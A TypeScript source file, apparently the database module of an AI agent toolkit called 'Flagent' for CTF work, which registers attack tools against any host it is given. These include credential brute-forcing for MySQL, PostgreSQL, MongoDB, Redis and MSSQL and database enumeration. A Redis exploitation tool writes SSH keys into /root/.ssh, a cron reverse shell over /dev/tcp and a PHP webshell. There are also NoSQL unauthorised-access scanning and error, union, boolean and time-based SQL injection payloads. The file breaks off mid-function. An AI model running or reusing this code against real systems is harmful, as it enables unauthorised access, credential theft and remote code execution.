import { z } from "zod";
import * as fs from "fs";
import * as child_process from "child_process";
import * as http from "http";
import * as https from "https";
import { ToolRegistry } from "./registry";

async function makeRequest(
  url: string,
  method: string = "GET",
  headers: Record<string, string> = {},
  body?: string,
  timeout: number = 10000
): Promise<{ statusCode: number; headers: Record<string, string>; body: string; error?: string }> {
  return new Promise((resolve) => {
    try {
      const parsedUrl = new URL(url);
      const isHttps = parsedUrl.protocol === "https:";
      const client = isHttps ? https : http;

      const options: any = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (isHttps ? 443 : 80),
        path: parsedUrl.pathname + parsedUrl.search,
        method: method.toUpperCase(),
        headers: { "User-Agent": "Flagent-CTF-Scanner/2.0", ...headers },
        timeout,
      };

      const req = client.request(options, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          const hdrs: Record<string, string> = {};
          for (const [k, v] of Object.entries(res.headers)) {
            hdrs[k] = Array.isArray(v) ? v.join(", ") : String(v);
          }
          resolve({ statusCode: res.statusCode || 0, headers: hdrs, body: data });
        });
      });

      req.on("error", (err) => resolve({ statusCode: 0, headers: {}, body: "", error: err.message }));
      req.on("timeout", () => { req.destroy(); resolve({ statusCode: 0, headers: {}, body: "", error: "timeout" }); });
      if (body) req.write(body);
      req.end();
    } catch (e: any) {
      resolve({ statusCode: 0, headers: {}, body: "", error: e.message });
    }
  });
}

export function createDatabaseTools(): ToolRegistry {
  const registry = new ToolRegistry();

  function commandExists(cmd: string): boolean {
    try {
      child_process.execSync(`command -v ${cmd}`, { stdio: "pipe" });
      return true;
    } catch {
      return false;
    }
  }

  function runCmd(cmd: string, timeout: number = 10000): { success: boolean; output: string; error?: string } {
    try {
      const output = child_process.execSync(cmd, {
        timeout,
        maxBuffer: 1024 * 1024,
        encoding: "utf-8",
        stdio: "pipe",
      });
      return { success: true, output: output.trim() };
    } catch (e: any) {
      return { success: false, output: (e.stdout || "").trim(), error: (e.stderr || e.message || "").trim() };
    }
  }

  function portOpen(host: string, port: number, timeoutMs: number = 2000): boolean {
    const cmd = process.platform === "darwin"
      ? `echo "" | nc -G ${Math.ceil(timeoutMs / 1000)} ${host} ${port} 2>/dev/null && echo "OPEN" || echo "CLOSED"`
      : `timeout ${Math.ceil(timeoutMs / 1000)} bash -c 'echo "" > /dev/tcp/${host}/${port}' 2>/dev/null && echo "OPEN" || echo "CLOSED"`;
    const result = runCmd(cmd, timeoutMs + 1000);
    return result.output.includes("OPEN");
  }

  function readListFile(path: string | undefined, fallback: string[]): string[] {
    if (path) {
      if (!fs.existsSync(path)) {
        return fallback;
      }
      try {
        const content = fs.readFileSync(path, "utf-8");
        return content.split(/\r?\n/).map((l) => l.trim()).filter((l) => l.length > 0);
      } catch {
        return fallback;
      }
    }
    return fallback;
  }

  const DEFAULT_WEAK_PASSWORDS = [
    "", "root", "admin", "password", "123456", "12345678", "test", "guest",
    "toor", "123", "admin123", "root123", "password123", "qwerty", "letmein",
    "master", "superman", "batman", "trustno1", "111111", "000000", "pass",
    "mysql", "postgres", "mongodb", "redis", "sa", "oracle", "ctf", "flag",
  ];

  registry.register({
    name: "db_connect_brute",
    description: "数据库账号密码爆破（MySQL/PostgreSQL/MongoDB/Redis/MSSQL），支持用户名/密码字典",
    parameters: z.object({
      db_type: z.enum(["mysql", "postgres", "mongodb", "redis", "mssql", "all"]).default("mysql").describe("数据库类型"),
      host: z.string().describe("目标主机 IP 或域名"),
      port: z.number().int().optional().describe("端口，默认使用各数据库标准端口"),
      username: z.string().optional().default("root").describe("单个用户名，默认 root"),
      username_list: z.string().optional().describe("用户名字典文件路径"),
      password_list: z.string().optional().describe("密码字典文件路径"),
      max_attempts: z.number().min(10).max(5000).default(200).describe("最大尝试次数 10-5000"),
      timeout_ms: z.number().optional().default(2000).describe("单连接超时 ms"),
    }),
    category: "database",
    requirePermission: true,
    execute: async (args: any) => {
      const { db_type, host, username, username_list, password_list, max_attempts, timeout_ms = 2000 } = args;
      let { port } = args;

      const defaultPorts: Record<string, number> = {
        mysql: 3306, postgres: 5432, mongodb: 27017, redis: 6379, mssql: 1433,
      };

      const dbTypes: string[] = db_type === "all"
        ? ["mysql", "postgres", "mongodb", "redis", "mssql"]
        : [db_type];

      const usernames = readListFile(username_list, [username]);
      let passwords = readListFile(password_list, DEFAULT_WEAK_PASSWORDS);
      passwords = passwords.slice(0, max_attempts);

      const results: string[] = [];
      let totalAttempts = 0;
      const foundCredentials: string[] = [];

      for (const dt of dbTypes) {
        const currentPort = port || defaultPorts[dt];
        const isPortOpen = portOpen(host, currentPort, timeout_ms);
        if (!isPortOpen) {
          results.push(`[${dt}] ${host}:${currentPort} 端口未开放，跳过`);
          continue;
        }

        let cliCmd = "";
        let cliName = "";
        const installHint: Record<string, string> = {
          mysql: "brew install mysql-client (macOS) | apt install mysql-client (Debian) | yum install mysql (CentOS)",
          postgres: "brew install libpq (macOS) | apt install postgresql-client (Debian) | yum install postgresql (CentOS)",
          mongodb: "brew install mongosh (macOS) | apt install mongodb-org-shell (Debian) | yum install mongodb-org-shell (CentOS)",
          redis: "brew install redis (macOS) | apt install redis-tools (Debian) | yum install redis (CentOS)",
          mssql: "brew install mssql-tools (macOS) | apt install mssql-tools (Debian) | yum install mssql-tools (CentOS)",
        };

        if (dt === "mysql") {
          cliName = "mysql";
          if (!commandExists("mysql")) {
            results.push(`[${dt}] mysql 客户端未安装: ${installHint.mysql}`);
            continue;
          }
        } else if (dt === "postgres") {
          cliName = "psql";
          if (!commandExists("psql")) {
            results.push(`[${dt}] psql 客户端未安装: ${installHint.postgres}`);
            continue;
          }
        } else if (dt === "mongodb") {
          cliName = commandExists("mongosh") ? "mongosh" : "mongo";
          if (!commandExists("mongosh") && !commandExists("mongo")) {
            results.push(`[${dt}] mongosh/mongo 客户端未安装: ${installHint.mongodb}`);
            continue;
          }
        } else if (dt === "redis") {
          cliName = "redis-cli";
          if (!commandExists("redis-cli")) {
            results.push(`[${dt}] redis-cli 客户端未安装: ${installHint.redis}`);
            continue;
          }
        } else if (dt === "mssql") {
          cliName = "sqlcmd";
          if (!commandExists("sqlcmd")) {
            results.push(`[${dt}] sqlcmd 客户端未安装: ${installHint.mssql}`);
            continue;
          }
        }

        results.push(`[${dt}] 开始爆破 ${host}:${currentPort} 用户=${usernames.length} 密码候选=${passwords.length}`);

        let found = false;
        for (const u of usernames) {
          if (found) break;
          for (const p of passwords) {
            if (totalAttempts >= max_attempts) { found = true; break; }
            totalAttempts++;

            let testCmd = "";
            if (dt === "mysql") {
              testCmd = `MYSQL_PWD='${p.replace(/'/g, "'\\''")}' mysql -h '${host}' -P ${currentPort} -u '${u.replace(/'/g, "'\\''")}' -e 'SELECT 1' --connect-timeout=${Math.ceil(timeout_ms / 1000)} 2>&1`;
            } else if (dt === "postgres") {
              testCmd = `PGPASSWORD='${p.replace(/'/g, "'\\''")}' psql -h '${host}' -p ${currentPort} -U '${u.replace(/'/g, "'\\''")}' -c 'SELECT 1' --no-password --timeout=${Math.ceil(timeout_ms / 1000)} 2>&1`;
            } else if (dt === "mongodb") {
              const pwPart = p ? `:${encodeURIComponent(p)}` : "";
              testCmd = `${cliName} --quiet --host '${host}' --port ${currentPort} -u '${u.replace(/'/g, "'\\''")}'${pwPart ? ` -p '${p.replace(/'/g, "'\\''")}'` : ""} --eval 'db.version()' --authenticationDatabase admin 2>&1 || true`;
            } else if (dt === "redis") {
              const auth = p ? `-a '${p.replace(/'/g, "'\\''")}' --no-auth-warning` : "";
              testCmd = `redis-cli -h '${host}' -p ${currentPort} ${auth} PING 2>&1 | head -1`;
            } else if (dt === "mssql") {
              testCmd = `sqlcmd -S '${host},${currentPort}' -U '${u.replace(/'/g, "'\\''")}' -P '${p.replace(/'/g, "'\\''")}' -Q 'SELECT 1' -t ${Math.ceil(timeout_ms / 1000)} 2>&1 | head -5`;
            }

            const r = runCmd(testCmd, timeout_ms + 500);
            const success =
              (dt === "mysql" && !r.error && /1\s*\n?/.test(r.output)) ||
              (dt === "postgres" && !r.error && /\(1 row\)/.test(r.output)) ||
              (dt === "mongodb" && !r.error && !/Error|AuthenticationFailed|connect failed/i.test(r.output) && r.output.length > 0) ||
              (dt === "redis" && !r.error && /PONG/.test(r.output)) ||
              (dt === "mssql" && !r.error && /\(1 rows affected\)/.test(r.output));

            if (success) {
              found = true;
              const cred = `[SUCCESS] ${dt}://${u}:${p || "(空)"}@${host}:${currentPort}`;
              foundCredentials.push(cred);
              results.push(cred);
              break;
            }
          }
        }

        if (!found && !foundCredentials.some((c) => c.includes(`@${host}:${currentPort}`))) {
          results.push(`[${dt}] 爆破完成，未发现有效凭据 (尝试 ${totalAttempts} 次)`);
        }
      }

      return `[数据库爆破] ${host}\n类型: ${db_type}\n最大尝试: ${max_attempts}\n总尝试: ${totalAttempts}\n\n结果:\n${results.join("\n")}\n\n找到凭据 (${foundCredentials.length}):\n${foundCredentials.join("\n") || "  (无)"}`;
    },
  });

  registry.register({
    name: "db_enum",
    description: "数据库枚举：列出数据库/表/用户/权限（支持 MySQL/PostgreSQL/MSSQL/SQLite）",
    parameters: z.object({
      db_type: z.enum(["mysql", "postgres", "mssql", "sqlite"]).describe("数据库类型"),
      host: z.string().describe("目标主机（sqlite 忽略）"),
      port: z.number().int().optional().describe("端口，默认标准端口"),
      username: z.string().describe("用户名（sqlite 忽略）"),
      password: z.string().describe("密码（sqlite 忽略）"),
      db_name: z.string().optional().describe("指定数据库名"),
      mode: z.enum(["schema", "tables", "users", "privileges", "all"]).default("all").describe("枚举模式"),
      sqlite_path: z.string().optional().describe("SQLite 文件路径（db_type=sqlite 时必填）"),
    }),
    category: "database",
    concurrent: true,
    execute: async (args: any) => {
      const { db_type, host, username, password, db_name, mode } = args;
      let { port, sqlite_path } = args;

      const defaultPorts: Record<string, number> = { mysql: 3306, postgres: 5432, mssql: 1433 };
      const sections: string[] = [];

      if (db_type === "sqlite") {
        if (!sqlite_path) return "[错误] sqlite 模式需指定 sqlite_path";
        if (!fs.existsSync(sqlite_path)) return `[错误] SQLite 文件不存在: ${sqlite_path}`;

        const useCli = commandExists("sqlite3");
        const schemaCmd = useCli
          ? `sqlite3 '${sqlite_path}' '.schema' 2>&1`
          : `python3 -c "import sqlite3;c=sqlite3.connect('${sqlite_path.replace(/'/g, "''")}');cur=c.cursor();cur.execute(\\\"SELECT sql FROM sqlite_master WHERE type='table'\\\");print('\\n'.join(r[0] or '' for r in cur.fetchall()))" 2>&1`;
        const tablesCmd = useCli
          ? `sqlite3 '${sqlite_path}' '.tables' 2>&1`
          : `python3 -c "import sqlite3;c=sqlite3.connect('${sqlite_path.replace(/'/g, "''")}');cur=c.cursor();cur.execute(\\\"SELECT name FROM sqlite_master WHERE type='table'\\\");print('\\n'.join(r[0] for r in cur.fetchall()))" 2>&1`;

        const schemaR = runCmd(schemaCmd, 10000);
        const tablesR = runCmd(tablesCmd, 5000);

        sections.push(`[SQLite] 文件: ${sqlite_path}`);
        if (mode === "all" || mode === "tables") sections.push(`\n表:\n  ${tablesR.output || "(无)"}`);
        if (mode === "all" || mode === "schema") sections.push(`\nSchema:\n${schemaR.output || "(空)"}`);

        return sections.join("\n");
      }

      const currentPort = port || defaultPorts[db_type];
      const isPortOpen = portOpen(host, currentPort, 2000);
      if (!isPortOpen) return `[错误] ${host}:${currentPort} 端口未开放`;

      if (db_type === "mysql") {
        if (!commandExists("mysql")) {
          return "[错误] mysql 客户端未安装: brew install mysql-client (macOS) | apt install mysql-client (Debian)";
        }
        const runQuery = (q: string) => {
          const cmd = `MYSQL_PWD='${password.replace(/'/g, "'\\''")}' mysql -h '${host}' -P ${currentPort} -u '${username.replace(/'/g, "'\\''")}' ${db_name ? `'${db_name.replace(/'/g, "'\\''")}'` : ""} -e '${q.replace(/'/g, "'\\''")}' -N -B 2>&1`;
          return runCmd(cmd, 8000);
        };

        sections.push(`[MySQL] ${host}:${currentPort} 用户=${username}`);
        if (mode === "all" || mode === "schema") {
          const dbs = runQuery("SHOW DATABASES;");
          sections.push(`\n数据库列表:\n${dbs.output || "(查询失败)"}`);
        }
        if (mode === "all" || mode === "tables") {
          const tgt = db_name || "information_schema";
          const tbls = runQuery(`SELECT table_schema,table_name,table_type FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys') ORDER BY table_schema,table_name;`);
          sections.push(`\n表列表:\n${tbls.output || "(无或需指定 db_name)"}`);
        }
        if (mode === "all" || mode === "users") {
          const usrs = runQuery("SELECT user,host,plugin FROM mysql.user;");
          sections.push(`\n用户:\n${usrs.output || "(权限不足)"}`);
        }
        if (mode === "all" || mode === "privileges") {
          const privs = runQuery(`SHOW GRANTS FOR '${username.replace(/'/g, "''")}'@'%';`);
          sections.push(`\n当前用户权限:\n${privs.output || "(无)"}`);
          const allPrivs = runQuery("SELECT user,host,Grant_priv,Super_priv,File_priv FROM mysql.user;");
          sections.push(`\n用户特权列:\n${allPrivs.output || "(权限不足)"}`);
        }
        return sections.join("\n");
      }

      if (db_type === "postgres") {
        if (!commandExists("psql")) {
          return "[错误] psql 客户端未安装: brew install libpq (macOS) | apt install postgresql-client (Debian)";
        }
        const runQuery = (q: string) => {
          const tgt = db_name || "postgres";
          const cmd = `PGPASSWORD='${password.replace(/'/g, "'\\''")}' psql -h '${host}' -p ${currentPort} -U '${username.replace(/'/g, "'\\''")}' -d '${tgt.replace(/'/g, "'\\''")}' -c '${q.replace(/'/g, "'\\''")}' -A -t -R '\n' 2>&1`;
          return runCmd(cmd, 8000);
        };

        sections.push(`[PostgreSQL] ${host}:${currentPort} 用户=${username}`);
        if (mode === "all" || mode === "schema") {
          const dbs = runQuery("SELECT datname FROM pg_database WHERE datistemplate=false;");
          sections.push(`\n数据库列表:\n${dbs.output || "(查询失败)"}`);
        }
        if (mode === "all" || mode === "tables") {
          const tbls = runQuery("SELECT table_schema,table_name,table_type FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') ORDER BY table_schema,table_name;");
          sections.push(`\n表列表:\n${tbls.output || "(无)"}`);
        }
        if (mode === "all" || mode === "users") {
          const usrs = runQuery("SELECT rolname,rolsuper,rolcreaterole,rolcreatedb FROM pg_roles;");
          sections.push(`\n角色:\n${usrs.output || "(权限不足)"}`);
        }
        if (mode === "all" || mode === "privileges") {
          const privs = runQuery("SELECT table_catalog,table_schema,table_name,privilege_type,grantee FROM information_schema.role_table_grants WHERE grantee=CURRENT_USER LIMIT 50;");
          sections.push(`\n当前权限 (TOP50):\n${privs.output || "(无)"}`);
        }
        return sections.join("\n");
      }

      if (db_type === "mssql") {
        if (!commandExists("sqlcmd")) {
          return "[错误] sqlcmd 客户端未安装: brew install mssql-tools (macOS) | apt install mssql-tools (Debian)";
        }
        const runQuery = (q: string) => {
          const tgt = db_name ? `-d '${db_name.replace(/'/g, "'\\''")}'` : "";
          const cmd = `sqlcmd -S '${host},${currentPort}' -U '${username.replace(/'/g, "'\\''")}' -P '${password.replace(/'/g, "'\\''")}' ${tgt} -Q '${q.replace(/'/g, "'\\''")}' -W -h -1 2>&1`;
          return runCmd(cmd, 10000);
        };

        sections.push(`[MSSQL] ${host}:${currentPort} 用户=${username}`);
        if (mode === "all" || mode === "schema") {
          const dbs = runQuery("SELECT name FROM sys.databases ORDER BY name;");
          sections.push(`\n数据库列表:\n${dbs.output || "(查询失败)"}`);
        }
        if (mode === "all" || mode === "tables") {
          const tbls = runQuery("SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,TABLE_TYPE FROM INFORMATION_SCHEMA.TABLES ORDER BY TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME;");
          sections.push(`\n表列表:\n${tbls.output || "(无)"}`);
        }
        if (mode === "all" || mode === "users") {
          const usrs = runQuery("SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE type IN ('S','U','G') ORDER BY name;");
          sections.push(`\n主体:\n${usrs.output || "(权限不足)"}`);
        }
        if (mode === "all" || mode === "privileges") {
          const privs = runQuery("SELECT dp.class_desc,dp.permission_name,dp.state_desc,sp.name AS grantee FROM sys.server_permissions dp JOIN sys.server_principals sp ON dp.grantee_principal_id=sp.principal_id ORDER BY sp.name,dp.permission_name;");
          sections.push(`\n权限:\n${privs.output || "(权限不足)"}`);
        }
        return sections.join("\n");
      }

      return "[错误] 不支持的数据库类型";
    },
  });

  registry.register({
    name: "redis_attack",
    description: "Redis 利用：未授权检测/信息/KEYS 枚举/写 SSH 公钥/写 cron/写 WebShell",
    parameters: z.object({
      host: z.string().describe("目标主机"),
      port: z.number().int().default(6379).describe("端口，默认 6379"),
      password: z.string().optional().describe("AUTH 密码"),
      mode: z.enum(["info", "keys", "rce_ssh", "rce_cron", "rce_webshell"]).default("info").describe("攻击模式"),
      webshell_path: z.string().optional().describe("WebShell 写入路径（/var/www/html/shell.php 等）"),
      ssh_public_key: z.string().optional().describe("SSH 公钥字符串（未提供则自动生成占位）"),
    }),
    category: "database",
    concurrent: true,
    requirePermission: true,
    execute: async (args: any) => {
      const { host, port = 6379, password, mode, webshell_path, ssh_public_key } = args;

      if (!commandExists("redis-cli")) {
        return "[错误] redis-cli 未安装: brew install redis (macOS) | apt install redis-tools (Debian) | yum install redis (CentOS)";
      }
      if (!portOpen(host, port, 2000)) {
        return `[错误] ${host}:${port} 端口未开放`;
      }

      const auth = password ? `-a '${password.replace(/'/g, "'\\''")}' --no-auth-warning` : "";
      const redis = (cmds: string[]) => {
        const pipeline = cmds.join("\n");
        const cmd = `printf '${pipeline.replace(/'/g, "'\\''").replace(/\n/g, "\\n")}\\n' | redis-cli -h '${host}' -p ${port} ${auth} 2>&1`;
        return runCmd(cmd, 8000);
      };
      const redisCmd = (c: string) => {
        const cmd = `redis-cli -h '${host}' -p ${port} ${auth} ${c} 2>&1`;
        return runCmd(cmd, 8000);
      };

      const results: string[] = [];
      results.push(`[Redis攻击] ${host}:${port} 模式=${mode}`);

      const pingR = redisCmd("PING");
      const unauthorized = !password && /PONG/.test(pingR.output);
      results.push(`\n未授权: ${unauthorized ? "⚠️ 是 (无需AUTH)" : "否"}`);

      if (mode === "info") {
        const infoR = redisCmd("INFO");
        results.push(`\nINFO 输出 (前200行):\n${infoR.output.slice(0, 6000)}${infoR.output.length > 6000 ? "\n...(截断)" : ""}`);
        const configDir = redisCmd("CONFIG GET dir");
        const configDb = redisCmd("CONFIG GET dbfilename");
        results.push(`\n持久化路径:\n${configDir.output}\n${configDb.output}`);
        return results.join("\n");
      }

      if (mode === "keys") {
        const keysR = redisCmd("KEYS *");
        const countR = redisCmd("DBSIZE");
        results.push(`\nDB 大小: ${countR.output}`);
        results.push(`\nKEYS 列表 (前500):\n${keysR.output.slice(0, 5000)}`);
        return results.join("\n");
      }

      if (mode === "rce_ssh") {
        const pubkey = ssh_public_key || "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCTestPlaceholderForCTFOnlyTest12345 flagent@ctf";
        const payload = `\n\n\n${pubkey}\n\n\n`;
        const r = redis([
          "CONFIG SET dir /root/.ssh",
          `CONFIG SET dbfilename authorized_keys`,
          `SET test "${payload.replace(/"/g, '\\"')}"`,
          "SAVE",
          "CONFIG SET dir /tmp",
          `CONFIG SET dbfilename dump.rdb`,
        ]);
        results.push(`\nSSH公钥写入尝试 (目标 /root/.ssh/authorized_keys):\n${r.output}${r.error ? `\n错误: ${r.error}` : ""}`);
        results.push(`\n使用公钥连接: ssh -i 私钥 root@${host}`);
        results.push(`注意: 若目标非 root，尝试 /home/user/.ssh/ 目录`);
        return results.join("\n");
      }

      if (mode === "rce_cron") {
        const cronPayload = "* * * * * root bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1' # flagent\n";
        const r = redis([
          "CONFIG SET dir /var/spool/cron",
          `CONFIG SET dbfilename root`,
          `SET xxx "${cronPayload.replace(/"/g, '\\"')}"`,
          "SAVE",
          "CONFIG SET dir /tmp",
          `CONFIG SET dbfilename dump.rdb`,
        ]);
        results.push(`\nCrontab 写入尝试 (/var/spool/cron/root):\n${r.output}${r.error ? `\n错误: ${r.error}` : ""}`);
        results.push(`\n说明: 可修改反弹地址为攻击者 IP，或写入 curl/wget 下载执行脚本`);
        return results.join("\n");
      }

      if (mode === "rce_webshell") {
        const path = webshell_path || "/var/www/html";
        const shell = `<?php system($_GET['cmd']); ?>`;
        const r = redis([
          `CONFIG SET dir ${path}`,
          `CONFIG SET dbfilename shell.php`,
          `SET webshell "${shell}"`,
          "SAVE",
          "CONFIG SET dir /tmp",
          `CONFIG SET dbfilename dump.rdb`,
        ]);
        results.push(`\nWebShell 写入尝试 (${path}/shell.php):\n${r.output}${r.error ? `\n错误: ${r.error}` : ""}`);
        results.push(`\n访问: http://${host}/shell.php?cmd=id`);
        return results.join("\n");
      }

      return results.join("\n");
    },
  });

  registry.register({
    name: "nosql_scan",
    description: "NoSQL 服务未授权扫描：MongoDB/Redis/CouchDB/Elasticsearch/Memcached",
    parameters: z.object({
      targets: z.string().describe("目标列表，host:port 逗号分隔，如 10.0.0.1:6379,10.0.0.2:27017"),
      types: z.array(z.string()).optional().default(["mongodb", "redis", "couchdb", "elasticsearch", "memcached"]).describe("要扫描的类型"),
      timeout_ms: z.number().default(3000).describe("单连接超时 ms"),
    }),
    category: "database",
    concurrent: true,
    execute: async (args: any) => {
      const { targets, types, timeout_ms = 3000 } = args;
      const defaultPorts: Record<string, number> = {
        mongodb: 27017, redis: 6379, couchdb: 5984,
        elasticsearch: 9200, memcached: 11211,
      };

      const typeList: string[] = types && types.length ? types : Object.keys(defaultPorts);
      const targetList = targets.split(",").map((t: string) => t.trim()).filter(Boolean);

      const fullTargets: Array<{ type: string; host: string; port: number }> = [];
      for (const tgt of targetList) {
        const [hpRaw, explicitType] = tgt.split("|");
        const [h, pStr] = hpRaw.split(":");
        const host = h;
        const typesToTry = explicitType ? [explicitType] : typeList;
        for (const tp of typesToTry) {
          const port = pStr ? parseInt(pStr, 10) : defaultPorts[tp];
          if (port) fullTargets.push({ type: tp, host, port });
        }
      }

      const results: string[] = [];
      for (const t of fullTargets) {
        const open = portOpen(t.host, t.port, timeout_ms);
        if (!open) {
          results.push(`  [${t.type}] ${t.host}:${t.port} - 端口关闭`);
          continue;
        }

        let unauthorized = false;
        let extraInfo = "";

        if (t.type === "redis") {
          if (commandExists("redis-cli")) {
            const r = runCmd(`redis-cli -h '${t.host}' -p ${t.port} PING 2>&1`, timeout_ms);
            if (/PONG/.test(r.output)) { unauthorized = true; }
            else if (/NOAUTH/.test(r.output + r.error)) { extraInfo = "需 AUTH"; }
          } else {
            const r = runCmd(`(echo -e 'PING\\r\\n'; sleep 1) | nc -w ${Math.ceil(timeout_ms / 1000)} '${t.host}' ${t.port} 2>&1`, timeout_ms + 1000);
            if (/PONG/.test(r.output)) unauthorized = true;
          }
        } else if (t.type === "mongodb") {
          const r = runCmd(`echo '{"ping":1}' | nc -w ${Math.ceil(timeout_ms / 1000)} '${t.host}' ${t.port} 2>&1 || true`, timeout_ms + 1000);
          const ok = /ok.*1|ismaster|WireProtocol/i.test(r.output);
          extraInfo = r.output.slice(0, 200);
          unauthorized = ok || r.output.length > 30;
        } else if (t.type === "elasticsearch") {
          const res = await makeRequest(`http://${t.host}:${t.port}/`, "GET", {}, "", timeout_ms);
          if (res.statusCode === 200 && /"name"|"cluster_name"/.test(res.body)) {
            unauthorized = true;
            extraInfo = res.body.slice(0, 200);
          } else if (res.statusCode === 401) {
            extraInfo = "需认证 (HTTP 401)";
          }
        } else if (t.type === "couchdb") {
          const res = await makeRequest(`http://${t.host}:${t.port}/_all_dbs`, "GET", {}, "", timeout_ms);
          if (res.statusCode === 200 && /\[.*\]/.test(res.body)) {
            unauthorized = true;
            extraInfo = `dbs=${res.body.slice(0, 150)}`;
          } else if (res.statusCode === 401) {
            extraInfo = "需认证";
          }
        } else if (t.type === "memcached") {
          const r = runCmd(`(echo -e 'stats\\r\\nquit\\r\\n'; sleep 1) | nc -w ${Math.ceil(timeout_ms / 1000)} '${t.host}' ${t.port} 2>&1 || true`, timeout_ms + 1000);
          if (/STAT\s+pid|STAT\s+uptime/.test(r.output)) {
            unauthorized = true;
            extraInfo = r.output.split("\n").slice(0, 5).join(" | ");
          }
        }

        const status = unauthorized
          ? `⚠️ 未授权可访问`
          : `✓ 已认证/不可访问`;
        results.push(`  [${t.type}] ${t.host}:${t.port} - ${status}${extraInfo ? ` | ${extraInfo}` : ""}`);
      }

      return `[NoSQL 未授权扫描] 目标数=${fullTargets.length} 类型=${typeList.join(",")}\n\n${results.join("\n")}`;
    },
  });

  registry.register({
    name: "sqlmap_advanced",
    description: "SQL注入高级利用：报错/布尔盲注/时间盲注/UNION 检测与利用（自动检测 + 构造 payload 模式匹配）",
    parameters: z.object({
      url: z.string().describe("目标 URL（含参数，如 http://x/page?id=1）"),
      data: z.string().optional().describe("POST body / 参数"),
      cookie: z.string().optional().describe("Cookie 字符串"),
      technique: z.enum(["error", "boolean", "time", "union", "auto"]).default("auto").describe("注入技术"),
      payload_mode: z.enum(["detect", "dbs", "tables", "columns", "dump", "shell"]).default("detect").describe("攻击模式"),
      db_name: z.string().optional().describe("指定数据库名（tables/columns/dump 用）"),
      table_name: z.string().optional().describe("指定表名（columns/dump 用）"),
      column_name: z.string().optional().describe("指定列名（dump 用）"),
      parameter: z.string().describe("注入参数名"),
    }),
    category: "database",
    concurrent: true,
    execute: async (args: any) => {
      const { url, data, cookie, technique, payload_mode, db_name, table_name, column_name, parameter } = args;
      const isPost = !!data;
      const headers: Record<string, string> = {};
      if (cookie) headers["Cookie"] = cookie;
      if (isPost) headers["Content-Type"] = "application/x-www-form-urlencoded";

      const inject = async (payload: string) => {
        const method = isPost ? "POST" : "GET";
        let tgt: string;
        let body: string | undefined;
        if (isPost) {
          tgt = url;
          body = data!.replace(new RegExp(`(${parameter}=)([^&]*)`), `$1${encodeURIComponent(payload)}`);
        } else {
          tgt = url.replace(new RegExp(`(${parameter}=)([^&]*)`), `$1${encodeURIComponent(payload)}`);
        }
        const start = Date.now();
        const res = await makeRequest(tgt, method, headers, body, 15000);
        return { res, elapsed: Date.now() - start, body: res.body, status: res.statusCode };
      };

      const findings: string[] = [];
      const suggestions: string[] = [];
      findings.push(`[SQLi 高级] ${url} 参数=${parameter} 方法=${isPost ? "POST" : "GET"} 技术=${technique} 模式=${payload_mode}`);

      const base = await inject("1");
      findings.push(`\n基准请求: ${base.status} 大小=${base.body.length} 耗时=${base.elapsed}ms`);

      const techniqueList: string[] = technique === "auto"
        ? ["error", "union", "boolean", "time"]
        : [technique];

      const detected: string[] = [];

      for (const tech of techniqueList) {
        if (tech === "error") {
          const errPayloads = [
            { p: "'", sig: /sql|syntax|mysql|postgres|oracle|sqlite|mariadb|ODBC|Microsoft SQL Server|ORA-|PG::/i },
            { p: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", sig: /Duplicate entry|subquery|GROUP BY/i },
            { p: "1%27%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,VERSION()))--", sig: /XPATH|ExtractValue|error/i },
            { p: "1' AND (SELECT CAST(DB_NAME() AS INT))--", sig: /Conversion|cast|convert.*int/i },
          ];
          for (const { p, sig } of errPayloads) {
            const r = await inject(p);
            if (sig.test(r.body) || sig.test(r.res.error || "")) {
              findings.push(`\n  ⚠️ [报错型] 检测到错误注入! payload=${p.slice(0, 60)}`);
              findings.push(`     错误特征: ${r.body.match(sig)?.[0] || "(match)"}`);
              detected.push("error");
              suggestions.push("报错注入: 使用 UPDATEXML/EXTRACTVALUE/XPATH/ERROR() 直接提取数据");
              break;
            }
          }
        }

        if (tech === "union") {
          for (let cols = 1; cols <= 10; cols++) {
            const nulls = Array(cols).fill("NULL").join(",");
            const p = `1' UNION SELECT ${nulls}--`;
            const r = await inject(p);
            if (r.body.length !== base.body.length && r.status === base.status && !/error|syntax/i.test(r.body)) {
              findings.push(`\n  ⚠️ [UNION] 可能列数=${cols} 响应大小=${r.body.length} vs 基准=${base.body.length}`);
              detected.push("union");
              suggestions.push(`UNION列数推测 ${cols}: 尝试 1' UNION SELECT 1,2,3...-- 定位显示位`);
              break;
            }
          }
        }

        if (tech === "boolean") {
          const rTrue = await inject("1' AND 1=1--");
          const rFalse = await inject("1' AND 1=2--");
          const lenDiff = Math.abs(rTrue.body.length - rFalse.body.length);
          if (lenDiff > 50 || rTrue.body.length === base.body.length && rFalse.body.length !== base.body.length) {
            findings.push(`\n  ⚠️ [布尔盲注] T=${rTrue.body.length}B F=${rFalse.body.length}B 差异=${lenDiff}B`);
            detected.push("boolean");
            suggestions.push("布尔盲注: 使用 1' AND (SUBSTRING(DB_NAME(),1,1)='a')-- 二分法逐字符提取");
          }
        }

        if (tech === "time") {
          const r1 = await inject("1");
          const delayPayloads = [
            "1' AND SLEEP(3)--",
            "1); WAITFOR DELAY '0:0:3'--",
            "1'; SELECT pg_sleep(3)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
          ];
          for (const dp of delayPayloads) {
            const r2 = await inject(dp);
            const diff = r2.elapsed - r1.elapsed;
            if (diff > 2000) {
              findings.push(`\n  ⚠️ [时间盲注] payload延迟 ${diff}ms (>2000ms) payload=${dp.slice(0, 50)}`);
              detected.push("time");
              suggestions.push("时间盲注: 使用 SLEEP/WAITFOR/pg_sleep 逐字符提取，结合 AND (IF(SUBSTRING(...),SLEEP(3),0))");
              break;
            }
          }
        }
      }

      findings.push(`\n检测到的注入技术: ${detected.length ? detected.join(", ") : "(无)"}`);

      if (detected.length > 0 && payload_mode !== "detect") {
